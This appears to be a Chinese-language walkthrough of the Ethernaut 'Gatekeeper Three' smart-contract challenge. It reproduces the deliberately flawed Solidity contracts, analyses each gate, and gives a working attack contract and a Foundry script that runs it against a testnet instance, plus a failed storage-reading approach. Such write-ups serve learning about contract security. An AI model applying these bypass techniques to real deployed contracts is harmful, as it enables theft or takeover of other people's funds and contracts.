# Gatekeeper-Three 

# Gatekeeper-Three wp

## 源代码

**目标**:越过守门人并且注册为一个参赛者

调用低级函数的返回值。\
注意语义。\
刷新存储在以太坊中的工作方式。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//0x644989166C3eE7Fd1A9A80eAe10851C564507772

contract SimpleTrick {
    GatekeeperThree public target;//地址,20bytes,0槽
    address public trick;//地址,20bytes,1槽
    uint256 private password = block.timestamp;//uint256,32bytes占满,2槽

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (
            address(this).balance > 0.001 ether &&
            payable(owner).send(0.001 ether) == false
        ) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}

```

## 源代码分析

文件中包含两个合约,一个SimpleTrick,一个GatekeeperThree

目标中的参赛者就是`entrant`,在GatekeeperThree合约的`enter()`函数中可以看到,只要满足三个修饰符,就能把`tx.origin`设为`entrant`,所以接下来一个一个去满足修饰符的条件

### gateone

```solidity
modifier gateOne() {
        require(msg.sender == owner);//调用construct0r()即可
        require(tx.origin != owner);
        _;
    }
```

第二句就是说需要间接调用一下的意思,那就写个攻击合约,`EOA(tx.origin)`调用`攻击合约(msg.sender)`,攻击合约调用目标合约

### gatetwo

```solidity
modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }
```

条件中的`allowEntrance`和这个`getAllowance()`函数有关:

```solidity
function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }
```

其中if的条件又跟合约SimpleTrick中的这个`checkPassword()`函数有关:

```solidity
//合约SimpleTrick
function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }
```

* `block.timestamp`（`uint`）：当前\*\*区块时间戳，\*\*以 Unix 纪元以来的秒数为单位

意思就是,如果\_password==pass,就返回true(这一步满足了`getAllowance()`函数中的if条件)

所以需要<font style="background-color:#f3bb2f;">找到password</font>,但是\*\*<font style="background-color:#f3bb2f;">password是private</font>\*\*,没有生成同名函数,[读槽](##错误思路)也不行

所以可以先随便输一个参数调用`checkPassword()`,目的是把password变成block.timestamp,而这个block.timestamp又是一个全局变量,所以可以

```solidity
    uint256 wang = block.timestamp;
    gatekeepThree.getAllowance(wang);
```

↑定义个uint256的变量用block.timestamp赋值,然后用这个变量来调用这个函数

```solidity
function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }
```

就可以了

### gatethree

```solidity
modifier gateThree() {
        if (
            address(this).balance > 0.001 ether &&
            payable(owner).send(0.001 ether) == false
        ) {
            _;
        }
    }
```

if有两个条件,都需要满足\*\*&&\*\*

1. **address(this).balance > 0.001 ether**call给攻击合约转钱,比0.001大就行
2. **payable(owner).send(0.001 ether) == false**

   receive()里写revert

## 攻击思路

1. 调用createTrick,实例化一下SimpleTrick合约
2. 调用construct0r()
3. 随便输个参数调用checkPassword()
4. 调用getAllowance()
5. 给address转钱
6. 调用enter()
7. 记得写receive()，里边是revert

## 攻击合约

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {SimpleTrick} from "./Gatekeeper-Three.sol";
import {GatekeeperThree} from "./Gatekeeper-Three.sol";

contract Attack {
    GatekeeperThree public gatekeepThree;
    SimpleTrick public simpleTrick;

    constructor(address addr) {
        gatekeepThree = GatekeeperThree(payable(addr));
    }

    function attack() external payable {
        gatekeepThree.createTrick();
        simpleTrick = SimpleTrick(gatekeepThree.trick());
        gatekeepThree.construct0r();
        simpleTrick.checkPassword(123);
        uint256 wang = block.timestamp;
        gatekeepThree.getAllowance(wang);
        (bool success, ) = address(this).call{value: 0.001000000000001 ether}(
            ""
        );

        gatekeepThree.enter();
        require(
            gatekeepThree.entrant() ==
                address(0x98707a8Cb53bD823f9c5353611018aF38533adE5),
            "attack no "
        );
    }

    receive() external payable {}
}
```

## 脚本

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "../lib/forge-std/src/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(
            payable(0x644989166C3eE7Fd1A9A80eAe10851C564507772)
        );
        attack.attack{value: 0.001000000000001 ether}();

        vm.stopBroadcast();
    }
}

```

## 错误思路

1. 找 password

```plain
代码中也分析了,password是2槽,所以这么读:

cast storage 0x644989166C3eE7Fd1A9A80eAe10851C564507772 2 --rpc-url $SEPOLIA_RPC

得到password,作为调用`checkPassword()`函数的参数就可以了,注意都是uint256所以可以直接用,有不一致的情况要转换一下再用
```

**错误原因**:实例地址是gatethree合约的,还没有调用createTrick()函数,

SimpleTrick合约还没创建呢

2. 还是找password(错的错的错的)

可以找到这个函数

```solidity
//合约SimpleTrick
function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
```

if有两个条件,都需要满足&&:

顺着address(this)可以找到这个函数:

```solidity
function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }
```

先是实例化了SimpleTrick合约,把msg.sender设为了address(this),然后调用了`trickInit()`:

```solidity
//SimpleTrick合约
function trickInit() public {
        trick = address(this);
  }
```

但是这个函数运行以后会把trick设为address(this),违反了第二条


> 更新: 2025-07-11 10:42:30  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ls2yeivlzmxnvm95>